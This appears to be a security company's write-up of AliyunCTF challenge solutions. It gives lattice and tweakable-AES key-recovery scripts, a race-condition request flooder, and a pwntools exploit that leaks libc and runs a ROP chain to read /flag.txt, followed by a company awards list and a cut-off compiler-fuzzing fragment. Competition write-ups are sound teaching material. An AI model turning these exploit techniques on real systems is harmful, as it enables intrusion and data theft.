leak3 = send_point(r,pk_B+3*pk_G)#  % m leak_3 = send_point(r,pk_B-3*pk_G) #DH(Alice_sk, -3*G + Bob_pk) % m leak3_= int(leak3)+int(leak_3)Q3x   = int((pk_A * 3)[0])left3 = (leak3_ + mmm*(e3+B)) * (gabx - Q3x)**2right3= 2*(a*(gabx+Q3x)+2*b+Q3x*gabx*(Q3x+gabx))F3    = left3 - right3F3   *= int(inverse_mod(F3.coefficients()[0],p))
leak4 = send_point(r,pk_B+4*pk_G) % m leak_4 = send_point(r, pk_B-4*pk_G) % m leak4_= int(leak4)+int(leak_4)Q4x   = int((pk_A * 4)[0])left4 = (leak4_ + mmm*(e4+B)) * (gabx - Q4x)**2right4= 2*(a*(gabx+Q4x)+2*b+Q4x*gabx*(Q4x+gabx))F4    = left4 - right4F4   *= int(inverse_mod(F4.coefficients()[0],p))
leak5 = send_point(r,pk_B+5*pk_G) #% m leak_5 = send_point(r,pk_B-5*pk_G) #ice_sk, -5*G + Bob_pk) % m leak5_= int(leak5)+int(leak_5)Q5x   = int((pk_A * 5)[0])left5 = (leak5_ + mmm*(e5+B)) * (gabx - Q5x)**2right5= 2*(a*(gabx+Q5x)+2*b+Q5x*gabx*(Q5x+gabx))F5    = left5 - right5F5   *= int(inverse_mod(F5.coefficients()[0],p))
#(n,d,t)=(5,2,1)#(n,d,t)=(5,3,2)#(n,d,t)=(5,3,2)def find_root(p,n,d,t,polys,bounds):    A,B,C,D,E=[],[],[],[],[]    for i in range(n):        polys[i]=polys[i].change_ring(ZZ)        __,cc,ee,bb,dd,aa=polys[i].coefficients()        A.append(aa)        B.append(bb)        C.append(cc)        D.append(dd)        E.append(ee)        R=polys[0].parent()    x=R.gens()        G = Sequence([],R)        # case l=0    for i in range(2*d):        G.append(p**d*x[0]**i)        # case l=1    for i in range(1,n+1):        G.append(p**d*x[i])        G.append(p**d*x[0]*x[i])        # case l=1    for i in range(0,n):        for j in range(2,2*d):            G.append(p**(d-1)*x[0]**(j-2)*polys[i]%(p**d))
    # case 1<l<=d    def work(choose):        l=len(choose)        RR=PolynomialRing(Zmod(p**(l-1)),1,'xx')        xx=RR.gen()        polys_l=[]        for i in choose:            polys_l.append(xx**2+E[i]*xx+D[i])        M=matrix(Zmod(p**(l-1)),2*l)        for i in range(l):            tmp=RR(1)            for j in range(l):                if(i!=j):                    tmp*=polys_l[j]            # print(tmp)            # print(tmp.coefficients())            tmp=tmp.coefficients()[::-1]            M[i]=tmp+[0]            M[i+l]=[0]+tmp        # print(M)        W=M.inverse()        w=W.change_ring(ZZ)        for i0 in range(2*l):            tmp=0            for (u,ui) in enumerate(choose):                tp=x[ui+1]                for vi in choose:                    if(vi!=ui):                        tp*=polys[vi]                tmp+=(w[i0,u]+w[i0,u+l]*x[0])*tp            G.append(p**(d-l+1)*tmp%(p**d))        tp=1        for i in choose:            tp*=polys[i]        for i0 in range(2*l,2*d):            G.append(p**(d-l)*tp*x[0]**(i0-2*l)%(p**d))
    #case l=d+1    def spec(choose):        l=len(choose)        RR=PolynomialRing(Zmod(p**(l-1)),1,"xx")        xx=RR.gen()        polys_l=[]        for i in choose:            polys_l.append(xx**2+E[i]*xx+D[i])        M=matrix(Zmod(p**(l-1)),2*l)        for i in range(l):            tmp=RR(1)            for j in range(l):                if(i!=j):                    tmp*=polys_l[j]            tmp=tmp.coefficients()[::-1]            M[i]=tmp+[0]            M[i+l]=[0]+tmp        W=M.inverse()        w=W.change_ring(ZZ)        for i0 in range(0,t+1):            H=0            for (u,ui) in enumerate(choose):                th=x[ui+1]                for vi in choose:                    if(vi!=ui):                        th*=polys[vi]                H+=(w[i0,u]+w[i0,u+l]*x[0])*th            J=0            for (u,ui) in enumerate(choose):                tj=C[ui]                for vi in choose:                    if(vi!=ui):                        tj*=polys[vi]                J+=(w[i0,u]+w[i0,u+l]*x[0])*tj            K=0            for (u,ui) in enumerate(choose):                tk=B[ui]-C[ui]*E[ui]                for vi in choose:                    if(vi!=ui):                        tk*=polys[vi]                K+=w[i0,u+l]*tk            # print((H+J+K)%(p**d))            G.append((H+J+K)%(p**d))
    def dfs(i,l,choose):        if(i==n):            if(l==0):                if(len(choose)<=d):                    work(choose)                else:                    spec(choose)            return        if(l>0):            dfs(i+1,l-1,choose+[i])        dfs(i+1,l,choose)                for l in range(2,d+2):        dfs(0,l,[])
    B, monomials = G.coefficient_matrix()    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]    for i, factor in enumerate(factors):        B.rescale_col(i, factor)    # B=B.dense_matrix().LLL()    B = flatter(B.dense_matrix())    B = B.change_ring(QQ)    for i, factor in enumerate(factors):        B.rescale_col(i, 1/factor)    print(polys[0].parent())    H = Sequence([], polys[0].parent().change_ring(QQ))    for h in filter(None, B*monomials):        H.append(h)    return H
F1 = F1.change_ring(ZZ)F2 = F2.change_ring(ZZ)F3 = F3.change_ring(ZZ)F4 = F4.change_ring(ZZ)F5 = F5.change_ring(ZZ)
polys = [F1,F2,F3,F4,F5]bounds = [B0] + [B for _ in range(5)]
n,d,t = 5,3,2ret = find_root(p,n,d,t,polys,bounds)mypol = []for poli in ret:    mypol.append(poli)print(len(mypol))def find_roots_CRT(R,Hs,bounds):    if bounds == None:        print("[-] CRT-find_roots need bounds")        return []    P = 2    M = 1
    ALERT = True    vars = R.gens()    k = len(vars)    Hs = [h.change_ring(ZZ) for h in Hs]    maxBound = max(bounds)*4    remainders = [[] for _ in range(k)]    modulus = []    times = 0    Maxtimes = 100
    while M < maxBound and times < Maxtimes:        P = next_prime(P)        R = R.change_ring(GF(P))        solutions = []        for i in range(len(Hs),0,-1):            I = R * (Hs[:i])            I = Ideal(I.groebner_basis())            if I.dimension() == 0:                solutions = I.variety()                if len(solutions) != 0:                    if len(solutions) > 1:                        if ALERT:                            ALERT = False                            print("[!] Find more than one roots! The result may goes wrong. ")                    else:                        solutions = [int(solutions[0][var]) for var in vars ]                        for remainder,solution in zip(remainders,solutions):                            remainder.append(solution)                        modulus.append(P)                        M *= P                        break
        if solutions == []:            times += 1    if times != Maxtimes:        return list(set(tuple(int(crt(remainders[i], modulus)) for i in range(k)))),M    else:        return []print("START my_ret")ret,M=find_roots_CRT(mypol[0].parent(),mypol[:36],bounds)
for i in range(len(ret)):    if(ret[i]>abs(ret[i]-M)):        ret[i]-=M
for e0 in ret:    e0=(e0+B0)*m+leak0    key = sha256(str(e0).encode()).digest()    sign=AES.new(key,AES.MODE_ECB).decrypt(enc_sign)    if(sign.startswith(b'Secret sign is ')):        sign=sign.split(b'Secret sign is ')[-1]        r.sendline(AES.new(key,AES.MODE_ECB).encrypt(sign[:-1]).hex().encode())        print(r.recvall())        # aliyunctf{ECHNP_is_not_as_difficult_as_I_thought}

Doctored Dobbertin v2

由于tweak每轮拓展密钥round_tweaks只有三四列不为0，通过调整tweak，使得round_tweaks每轮三四列密钥与const异或后分别等于const一二列。即round_tweaks[3][i]^const[3][i] = const[1][i], round_tweaks[4][i]^const[4][i] = const[2][i], i=1,…4，按照附件，第一个索引代表列。

这样保持除最后一轮外，每轮加密后的密文第一、二列分别等于第三、四列。而在最后一轮的拓展密钥的一二列为0，故p[1]^round_keys[-1][3] = p[3]， p[2]^round_keys[-1][4] = p[4]，p是最终密文。从而可以得到round_keys[-1]，也就是八个和key有关的字节。

最后利用排列的性质算出key的哪些位经过了sbox及次数，可以恢复出八个key的字节。key的第一、七位字节直接爆破，随后解密。

import os, sysfrom sage.crypto.sbox import SBoxclass TAES_Oracle:    rounds = 10    keysize = 10
    s_box = (    0x41, 0x2E, 0x6A, 0x26, 0x74, 0xD6, 0xB9, 0x6D, 0x27, 0x39, 0x63, 0xEC, 0xD5, 0xDC, 0x2C, 0x70,    0xA6, 0xC1, 0x58, 0xA7, 0x0C, 0x5A, 0xCE, 0x02, 0xB5, 0x4A, 0xF1, 0xDD, 0xD3, 0x7C, 0xBF, 0xFE,    0x3A, 0xE4, 0x67, 0xCB, 0x60, 0x37, 0x5C, 0x93, 0xD1, 0x77, 0xAF, 0xAB, 0x38, 0xBC, 0xE1, 0x17,    0x35, 0x07, 0xB7, 0xBA, 0xB6, 0xB0, 0x4E, 0xB1, 0x69, 0x20, 0xCF, 0xEF, 0x9A, 0xEB, 0xFD, 0x32,    0xF0, 0x13, 0x00, 0xE0, 0x18, 0x9C, 0x52, 0x50, 0x4D, 0x24, 0x9B, 0xE2, 0x36, 0x2A, 0xAD, 0x59,    0xFB, 0xB4, 0x19, 0xF4, 0x48, 0xF7, 0x6B, 0x6C, 0x7B, 0x81, 0x3F, 0xD0, 0x68, 0x1A, 0x5D, 0x8A,    0x4C, 0xD8, 0xAE, 0xD7, 0x2B, 0x2D, 0x9D, 0xFA, 0x97, 0x1B, 0x43, 0xAA, 0x06, 0x14, 0x10, 0xD2,    0x28, 0x9E, 0xB8, 0x78, 0x5B, 0x85, 0xA4, 0x7D, 0x23, 0x92, 0x25, 0x46, 0x62, 0xA3, 0x42, 0x0D,    0x09, 0xE3, 0x83, 0x0F, 0xF6, 0x7F, 0x31, 0x6F, 0xC3, 0xDE, 0x79, 0x99, 0x03, 0x22, 0xA9, 0xB3,    0x1F, 0x7A, 0x01, 0x0E, 0xDB, 0xDF, 0xE6, 0x0A, 0x3B, 0x57, 0xCC, 0xEA, 0x30, 0x98, 0xDA, 0x16,    0x2F, 0x3E, 0x29, 0x54, 0x87, 0x8D, 0x72, 0x40, 0x3D, 0xFC, 0x66, 0xCD, 0xE7, 0x84, 0x7E, 0xC6,    0xA8, 0xAC, 0x51, 0x65, 0x71, 0x08, 0x33, 0x6E, 0x1D, 0x80, 0x55, 0xBB, 0x5E, 0x61, 0xC2, 0xF2,    0x76, 0x91, 0xF8, 0x45, 0x64, 0xFF, 0x86, 0x95, 0xEE, 0x1C, 0xE9, 0x8B, 0x12, 0x34, 0xC4, 0x8C,    0x56, 0x90, 0x5F, 0x82, 0xA2, 0x53, 0x96, 0x73, 0xBE, 0x88, 0x47, 0x4B, 0x15, 0xBD, 0xC5, 0x3C,    0xD9, 0xCA, 0xE8, 0xF9, 0x4F, 0xA0, 0xC0, 0x04, 0xB2, 0x9F, 0x11, 0x21, 0xA1, 0x0B, 0x44, 0xE5,    0x89, 0x8F, 0x75, 0x1E, 0xC9, 0x94, 0x8E, 0xC8, 0x49, 0xF5, 0x05, 0xD4, 0xED, 0xF3, 0xC7, 0xA5,    )    Constants = [        0x4d7f6272fa2b30231ff271b11265b29e,        0x87590fe9a805a3feefc710abdc104f51,        0xcbcae366693452003b30f0c6c6512d51,        0x46fa1c00c058e3929667197beba269a6,        0x0377c657fdc1b7d6eb5c1f08299013d8,        0xdf45e38398bcbc33818f1d21159cca89,        0x254a53e8a055e79672bf4781a3e0371b,        0x121a7c76c50df79fbab9346b6b899dce,        0x1381be9c3e73304d09c153e81d21bd5e,        0xcdc6bfdf5d354c1fcaad1ec5c95dd200    ]            def __init__(self):        self.key = bytearray(os.urandom(self.keysize))        self.InvSbox = SBox(s_box).inverse()    def _sub_bytes(self, s):        for i in range(4):            for j in range(4):                s[i][j] = self.s_box[s[i][j]]
    def __inv_sub_bytes(self, s):        for i in range(4):            for j in range(4):                s[i][j] = self.InvSbox[s[i][j]]                    def _shift_rows(self, s):        s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]        s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]
    def __inv_shift_rows(self, s):        s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]        s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]
    def _add_round_key(self, s, k):        for i in range(4):            for j in range(4):                s[i][j] ^= k[i][j]
    _xtime = lambda self, a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)
    def _mix_single_column(self, a):        # see Sec 4.1.2 in The Design of Rijndael        t = a[0] ^ a[1] ^ a[2] ^ a[3]        u = a[0]        a[0] ^= t ^ self._xtime(a[0] ^ a[1])        a[1] ^= t ^ self._xtime(a[1] ^ a[2])        a[2] ^= t ^ self._xtime(a[2] ^ a[3])        a[3] ^= t ^ self._xtime(a[3] ^ u)
    def _mix_columns(self, s):        for i in range(4):            self._mix_single_column(s[i])
    def __inv_mix_columns(self, s):        # see Sec 4.1.3 in The Design of Rijndael        for i in range(4):            u = self._xtime(self._xtime(s[i][0] ^ s[i][2]))            v = self._xtime(self._xtime(s[i][1] ^ s[i][3]))            s[i][0] ^= u            s[i][1] ^= v            s[i][2] ^= u            s[i][3] ^= v
        self._mix_columns(s)
    def _bytes2matrix(self, text):        """ Converts a 16-byte array into a 4x4 matrix.  """        return [list(text[i:i+4]) for i in range(0, len(text), 4)]
    def _matrix2bytes(self, matrix):        """ Converts a 4x4 matrix into a 16-byte array.  """        return bytes(sum(matrix, []))
    def _expand_key(self, key):        perm = [8, 1, 7, 2, 0, 3, 4, 9, 5, 6]        key_bytes = list(key)        assert(len(key_bytes) == 10)        round_keys = []
        for i in range(self.rounds):            rk = []            rk.append( [key_bytes[i] for i in range(4)] )            rk.append( [key_bytes[i] for i in range(4, 8)] )            rk.append( [key_bytes[i] for i in range(4)] )            rk.append( [key_bytes[i] for i in range(4, 8)] )
            round_keys.append(rk)
            p_key_bytes = [0] * 10
            for p in range(10):                p_key_bytes[perm[p]] = key_bytes[p]
            key_bytes = p_key_bytes            key_bytes[0] = self.s_box[key_bytes[0]]
        rk = []        rk.append( [0]*4 )        rk.append( [0]*4 )        rk.append( [key_bytes[i] for i in range(4)] )        rk.append( [key_bytes[i] for i in range(4, 8)] )        round_keys.append(rk)                return round_keys
    def _expand_tweak(self, tweak_bits):        assert(len(tweak_bits) == 128)        round_tweaks = []
        for i in range(self.rounds):            rt = [bytes(4), bytes(4)]            tweak2 = []            tweak3 = []
            for j in range(4):                tweak2_byte = ""                tweak3_byte = ""                for b in range(8):                    tweak2_byte += tweak_bits[ (11*(i+1) + (j*8) + b) % 128 ]                    tweak3_byte += tweak_bits[ (11*(i+1) + 32 + (j*8) + b) % 128 ]
                tweak2.append( int(tweak2_byte, 2) )                tweak3.append( int(tweak3_byte, 2) )
            rt.append(bytes(tweak2))            rt.append(bytes(tweak3))
            round_tweaks.append(rt)
        return round_tweaks
    def _add_constants(self, p, r):
        for col in range(4):            for row in range(4):                con = (self.Constants[r] >> (((3-col)*4 + (3-row)) * 8)) & ((1<<8) - 1)
                p[col][row] ^= con
    def encrypt(self, plaintext, tweak):        assert len(plaintext) == 16        p = self._bytes2matrix(plaintext)        tweak = bin(int(tweak, 16))[2:].zfill(128)  # 16bytes        round_keys = self._expand_key(self.key)        round_tweaks = self._expand_tweak(tweak)
        for i in range(self.rounds - 1):            self._add_round_key(p, round_keys[i])            self._add_round_key(p, round_tweaks[i])            self._add_constants(p, i)
            self._sub_bytes(p)            self._shift_rows(p)            self._mix_columns(p)
        self._add_round_key(p, round_keys[self.rounds-1])        self._add_round_key(p, round_tweaks[self.rounds-1])        self._add_constants(p, self.rounds-1)        self._sub_bytes(p)        self._shift_rows(p)        self._add_round_key(p, round_keys[self.rounds])
        return self._matrix2bytes(p)
    def decrypt(self, ciphertext, tweak):        p = self._bytes2matrix(ciphertext)        tweak = bin(int(tweak, 16))[2:].zfill(128)  # 16bytes        round_keys = self._expand_key(self.key)        round_tweaks = self._expand_tweak(tweak)
        self._add_round_key(p, round_keys[self.rounds])        self.__inv_shift_rows(p)        self.__inv_sub_bytes(p)        self._add_constants(p, self.rounds-1)        self._add_round_key(p, round_tweaks[self.rounds-1])        self._add_round_key(p, round_keys[self.rounds-1])
        for i in range(8, -1, -1):            self.__inv_mix_columns(p)            self.__inv_shift_rows(p)            self.__inv_sub_bytes(p)            self._add_constants(p, i)            self._add_round_key(p, round_tweaks[i])            self._add_round_key(p, round_keys[i])
        return self._matrix2bytes(p)
Constants = [        0x4d7f6272fa2b30231ff271b11265b29e,        0x87590fe9a805a3feefc710abdc104f51,        0xcbcae366693452003b30f0c6c6512d51,        0x46fa1c00c058e3929667197beba269a6,        0x0377c657fdc1b7d6eb5c1f08299013d8,        0xdf45e38398bcbc33818f1d21159cca89,        0x254a53e8a055e79672bf4781a3e0371b,        0x121a7c76c50df79fbab9346b6b899dce,        0x1381be9c3e73304d09c153e81d21bd5e,        0xcdc6bfdf5d354c1fcaad1ec5c95dd200    ]const_10round = []for r in range(10):    tmp_round = []    for col in range(0, 4):        tmp = []        for row in range(4):            con = (Constants[r] >> (((3-col)*4 + (3-row)) * 8)) & ((1<<8) - 1)            tmp.append(con)        tmp_round.append(tmp)    const_10round.append(tmp_round)tk_bits = [0]*128for r in range(10):    rt = const_10round[r]    tk0 = [i for i in bytearray(rt[0])]    tk1 = [i for i in bytearray(rt[1])]    tk2 = [i for i in bytearray(rt[2])]    tk3 = [i for i in bytearray(rt[3])]    for j in range(4):        tk2_byte = bin(tk2[j]^tk0[j])[2:].zfill(8)        tk3_byte = bin(tk3[j]^tk1[j])[2:].zfill(8)        for b in range(8):            if tk_bits[(11*(r+1) + (j*8) + b) % 128 ] == 0:                tk_bits[ (11*(r+1) + (j*8) + b) % 128 ] = tk2_byte[b]            else:                if tk_bits[(11*(r+1) + (j*8) + b) % 128 ] != tk2_byte[b]:                    print("Collision")            if tk_bits[(11*(r+1) + 32 + (j*8) + b) % 128 ]== 0:                tk_bits[ (11*(r+1) + 32 + (j*8) + b) % 128 ] = tk3_byte[b]            else:                if tk_bits[(11*(r+1) + 32 + (j*8) + b) % 128 ] != tk3_byte[b]:                    print("Collision")
tk_bits = ''.join(tk_bits)tweak = hex(int(tk_bits, 2))
from pwn import *from hashlib import sha256from string import ascii_letters, ascii_lowercase, digits
for _ in range(256):    r = remote('crypto2.aliyunctf.com', 13337)    def proof(r):        text=r.recvline()        print(text)        tmp=text.split(b'XXXX + ')[-1]        suf,val=tmp.strip().split(b') == ')        suf=suf.decode()        val=val.decode()        poss=ascii_letters + digits        for a in poss:            for b in poss:                for c in poss:                    for d in poss:                        digest = sha256((a+b+c+d+suf).encode()).hexdigest()                        if(digest==val):                            r.sendline((a+b+c+d).encode())                            return
    instance = TAES_Oracle()    sbox = SBox(instance.s_box)    Sinv = sbox.inverse()
    proof(r)            r.recvuntil(b'Enter your challenge: >')    m = b'x00' * 16    r.sendline(m.hex().encode())    r.recvuntil(b'Enter your challenge tweak: >')    r.sendline(tweak.encode())    enc = bytes.fromhex(r.recvline().strip().decode())    r.recvuntil(b'You got a challenge: ')    challenge = bytes.fromhex(r.recvline().strip().decode())    r.recvuntil(b'Tweak used:')    init_tweak = r.recvline().strip().decode()    r.recvuntil(b'Enter your guess: >')
    enc_matrix = instance._bytes2matrix(enc)    key9 = xor(enc_matrix[0], enc_matrix[2])    key10 = xor(enc_matrix[1], enc_matrix[3])
    k3 = key9[:]    k4 = key10[:]    keys = [None, k3[1], Sinv[k4[3]], Sinv[k3[2]], Sinv[Sinv[k3[0]]], Sinv[k3[3]], Sinv[k4[0]], None, Sinv[k4[1]], Sinv[k4[2]]]    is_True = False    for i in range(128):        if is_True:            break        for j in range(128):            keys[0] = i            keys[7] = j            instance.key = bytes(keys)            enc2 = instance.encrypt(m, tweak)            if enc2 == enc:                print("Found key")                keys = bytes(keys)                is_True = True                break    instance.key = keys    token = instance.decrypt(challenge, init_tweak)    r.sendline(token.hex().encode())    r.recvline()    try:        r.recvline()    except:        r.close()        continue# aliyunctf{8ackd00r_15_ev3rywh3re}

Misc

帕鲁情感管理

# pip install nltk# import nltk# nltk.download('vader_lexicon')# nltk.download('punkt')# nltk.download('stopwords')

import hashlibimport itertoolsfrom pwn import *from string import digits, ascii_letters, punctuationfrom nltk.sentiment.vader import SentimentIntensityAnalyzerfrom nltk.corpus import stopwordsfrom nltk.tokenize import word_tokenizefrom nltk.stem import PorterStemmer
def preprocess_text(text):    # 分词    words = word_tokenize(text)
    # 去除停用词和非字母字符    stop_words = set(stopwords.words('english'))    words = [word for word in words if word.isalpha() and word not in stop_words]
    # 词干提取    ps = PorterStemmer()    words = [ps.stem(word) for word in words]
    # 返回处理后的词汇列表    sen = ','.join(words)    return sen
def sentiment_analysis(r, pos, neg, neu):    sentence = r.recvline().decode()    sentiment = sia.polarity_scores(sentence)    print('[+]The compound is :{}'.format(sentiment['compound']))    if sentiment['compound'] > 0.3:        r.sendlineafter(b'answer:', pos)    elif sentiment['compound'] < -0.15:        r.sendlineafter(b'answer:', neg)    else:        r.sendlineafter(b'answer:', neu)
def proof_work(prefix:bytes,output:str):    s = bytes([i for i in range(97,97+26)])+b"0123456789"    for a1 in s:        for a2 in s:            for a3 in s:                for a4 in s:                    t = bytes([a1,a2,a3,a4])                    m = prefix+t                    if hashlib.sha256(m).hexdigest()==output:                        return twhile True:        try:            sia = SentimentIntensityAnalyzer()            r = remote("misc0.aliyunctf.com", 9999)            message = r.recvline().decode()            context.log_level = 'debug'            print(message)
            alpha_bet = digits + ascii_letters + punctuation            strlist = itertools.product(alpha_bet, repeat=4)
            sha26 = message.split('=')[1].strip()            start = message.find('"')+1            end = message.find('"', start)            head = message[start:end]
                        ans = proof_work(head.encode(),sha26)            # r.interactive()            r.sendline(ans)            r.sendlineafter(b'n)', b'n')
            pos = 'positive'.encode()            neg = 'negative'.encode()            neu = 'neutral'.encode()
            r.sendlineafter(b'n)', b'y')            for i in range(15):                sentiment_analysis(r, pos, neg, neu)
            break  # 如果执行成功，跳出无限循环        except EOFError:            r.close()            continue

公司荣誉

2021年 CVVD首届车联网漏洞挖掘赛二等奖

2021年 第二届“祥云杯”网络安全大赛总决赛三等奖

2021年 浙江省信息通信行业网络安全技能竞赛个人竞赛二等奖

2021年 浙江省信息通信行业网络安全技能竞赛团体竞赛一等奖

2021年 智能网联汽车安全测评技能大赛智能网联汽车破解悬赏赛三等奖

2022年 首届中国智能网联汽车数据与隐私安全技能大赛最佳数据安全漏洞挖掘奖

2022年 第六届河北师范大学信息安全挑战赛暨HECTF2022优秀技术支持单位

2022年 浙江省信息通信行业网络安全技能竞赛个人竞赛二等奖

2022年 浙江省信息通信行业网络安全技能竞赛团体竞赛一等奖

2022年 中国工业互联网安全大赛（浙江省选拔赛）团体竞赛三等奖

2022年 第二届“之江杯”工业互联网广义功能安全国际精英挑战赛冠军（特等奖）

2022年 第二届“之江杯”工业互联网广义功能安全国际精英挑战赛广义功能安全奖

2023年 “凌武杯”杭州未来科技城网络与信息安全管理员职业技能竞赛优秀承办单位

2023年 浙江省信息通信行业职业技能竞赛（网络与信息安全管理员）个人赛冠军

2023年 浙江省信息通信行业职业技能竞赛（网络与信息安全管理员）团队赛二等奖

2023年 浙江省工业互联网安全竞赛三等奖

2023年 “梦想·中移杯”杭州未来科技城软件系统测试职业技能大赛二等奖

2023年 软件供应链安全竞赛优秀支撑单位

2023年 第七届河北师范大学信息安全挑战赛暨HECTF2023优秀技术支持单位

2023年 第四届电信和互联网行业职业技能竞赛个人赛二等奖

2023年 全国网络与信息安全管理员职工职业技能竞赛一等奖

2023年 “补天杯”破解大赛亚军

2023年 首届“强基杯”数据安全技能竞赛数据安全实战赛道全国二等奖

2023年 首届“强基杯”数据安全技能竞赛复赛华东赛区数据安全实战赛道团队三等奖

2023年 全国行业职业技能竞赛–第二届全国数据安全职业技能竞赛总决赛一等奖

杭州凌武科技有限公司是一家专注于网络安全的新兴企业，自主研发了竞赛平台、实训平台、文件追踪平台、攻防演练平台、钓鱼演练平台等多款安全产品，提供专业的渗透测试、漏洞挖掘、安全培训、竞赛支撑等服务，对车联网安全、物联网安全、工控安全等新方向有深入的研究，致力于成为客户信赖的安全伙伴。如果您有以上相关业务的需求，欢迎随时联系我们。

关注我们

联系我们


```
func (rtr *Router) Handle(method string, pattern string, handlers []Handler) {    rtr.handle(method, pattern, func(resp http.ResponseWriter, req *http.Request) {       c := rtr.m.createContext(resp, req)       for _, h := range handlers {          c.mws = append(c.mws, getMWFromHandler(h))       }       c.run()    })}
```



```
package main
import (    "fmt"    "io"    "log"    "net/http"    "os"    "strings")
var url = "http://web2.aliyunctf.com:35084"
func main() {    limiter1 := make(chan struct{}, 64)    limiter2 := make(chan struct{}, 32)    go func() {       for {          limiter1 <- struct{}{}          go func() {             if SendSlash() {                os.Exit(0)             }          }()          <-limiter1          limiter1 <- struct{}{}          go func() {             if SendSlash() {                os.Exit(0)             }          }()          <-limiter1          <-limiter2       }    }()    var i = 0    go func() {       for {          limiter2 <- struct{}{}          i++          fmt.Println("try", i)          go func() {             if SendFlag() {                os.Exit(0)             }          }()       }    }()    select {}}
func SendSlash() bool {    get, err := http.Get(url + "/")    if err != nil {       log.Println(err)    }    if get != nil {       defer get.Body.Close()       return checkBody(get.Body)    }    return false}
func SendFlag() bool {    get, err := http.Get(url + "/flag")    if err != nil {       log.Println(err)    }    if get != nil {       defer get.Body.Close()       return checkBody(get.Body)    }    return false}
func checkBody(rd io.Reader) bool {    data, _ := io.ReadAll(rd)    if data == nil {       return false    }    if strings.Contains(string(data), "aliyunctf{") {       fmt.Println(string(data))       return true    }    return false}
```



```
#include<bits/stdc++.h>int mmm={...};int e[10][10],use[10][10];int flag[20];void dfs(int u,int len){    flag[len]=u;    if(len==17){        if(flag[1]>flag[2] && flag[3]<flag[4]&&flag[0] == flag[8]&&flag[11] == flag[15]&&flag[10] > flag[5]&&flag[3] < flag[13]&&flag[7] < flag[4]&&flag[14] == 7&&flag[17] == 4){            for(int i=0;i<18;i++)                printf("%d",flag[i]);            puts("");            exit(0);        }        return;    }    for(int v=0;v<9;v++)        if(e[u][v]&&!use[u][v]){            use[u][v]=use[v][u]=1;            dfs(v,len+1);            use[u][v]=use[v][u]=0;        }}int main(){    freopen("1.out","w",stdout);    for(int i=0;i<9;i++){        for(int j=0;j<9;j++){            e[i][j]=mmm[i*9+j];            // printf("%d ",e[i][j]);        }        // puts("");    }    for(int i=0;i<9;i++)        dfs(i,0);    return 0;}
```



```
def show_ptr():    nums = [0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1]    io.sendlineafter(b'hhh', b'1')    io.sendlineafter(b'size', str(0x500).encode())    io.send(b'n')    for i in nums:        io.sendline(str(i).encode())    io.sendlineafter(b'hhh', b'2')
```



```
#!/usr/bin/python3.8# -*- encoding: utf-8 -*-from pwn import *from ctools import *
context(os="linux", arch="amd64", terminal=['tmux', 'splitw', '-h', '-F' '{pane_pid}', '-P']) # context.log_level = "debug"
proc = './pwn-sign_in'libc_path = './libc-2.31.so'
init_proc_with_libc(proc, libc_path)DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)
# io = process([proc])# io = process(['./ld-2.23.so', proc], env={'LD_PRELOAD': libc_path})io = remote('pwn0.aliyunctf.com', 9999)
elf = ELF(proc)libc = ELF(libc_path, checksec=False)

def assign_val(chunk_size, data, arrays):    io.sendafter(b"hhhn", b"1".ljust(4, b"x00"))    io.sendlineafter(b"size???n", str(chunk_size).encode())    io.sendline(data)    io.recvline(b"Lucky Numbersn")    for i in arrays:        io.sendline(str(i).encode())

def get_array(*indexs):    arr = [0] * 16    for i in indexs:        arr[i] = 3    return arr

def leak_addr():    arr = get_array(15, 13, 2, 3, 4, 14)    assign_val(0x500, b"a"*8, arr)    io.sendafter(b"hhhn", b"2".ljust(4, b"x00"))    # libc_base = recv_libc_addr(io, offset=0x1ebbe0)    # log_libc_base_addr(libc_base)
    io.recvuntil(b'a' * 0x8)        libc.address = u64(io.recv(6).ljust(8, b'x00')) - 0x1ebbe0 - 0x1000    success(hex(libc.address))

def rop_attack():    arr = get_array(15, 1, 2, 3, 4, 14, 6)    assign_val(0x10, b"deadbeef", arr)    io.sendafter(b"hhhn", b"2".ljust(4, b"x00"))    io.sendafter(b"xmkin", cyclic(0x200, n=8))    for _ in range(0x42):        io.sendline(str(0x61616161).encode())    io.sendline(b"-")    io.sendline(b"-")    io.sendline(str(0x61616161).encode())    io.sendline(str(0x61616161).encode())
    rop = ROP(libc)    target_addr = libc.symbols['__free_hook'] + 0x10    rop.call('read', [0, target_addr, 0x100])    rop.call('open', [target_addr, 0, 0])    rop.call('read', [3, target_addr, 0x50])    rop.call('write', [1, target_addr, 0x50])    payload = p64(libc.address + 0x119434) + rop.chain()    print(rop.dump())
    for i in range(0, len(payload), 4):        num = u32(payload[i:i+4])        io.sendline(str(num).encode())    # DEBUG('b * $rebase(0x2512)')    for _ in range(0x200-0x42-4-(len(payload) // 4)):        io.sendline(str(0x61616161).encode())        sleep(1)    io.sendline(b'/flag.txtx00')
    io.interactive()

def exp():    leak_addr()    rop_attack()
if __name__ == "__main__":    exp()
```



```
I tried to write a toy compiler from scratch, but it's buggy af. Hopefully it's not insecure!nc pwn2.aliyunctf.com 9999attachment
```



```
function printNumbers(int n) : int i -> void{    i := 0;    do {        printi(i);        i := i + 1;    } while (i <= n);    return;}
function arrayTest() : int i, array arr -> void {    i := 0;    arr := array_new(10);    do {        printi(arr[0]);        i := i + 1;    } while (i <= 10);    return;}
function main() : -> int {    prints("123");    printNumbers(10);    arrayTest();    return 0;}
```



```
gcc -no-pie -o out ./out.S ./src/runtime/wrapper.S ./src/runtime/main.c ./src/runtime/api.c
```



```
ASAN_OPTIONS=detect_leaks=0 ./src/build/compiler/klang_asan ./1.k
```



```
klang/src/build via △ v3.28.3 ❯ echo $ASAN_OPTIONSdetect_leaks=0,abort_on_error=1,symbolize=0
klang/src/build via △ v3.28.3 ❯ ./compiler/klang out_dir/default/queue/id:000000,time:0,execs:0,orig:a
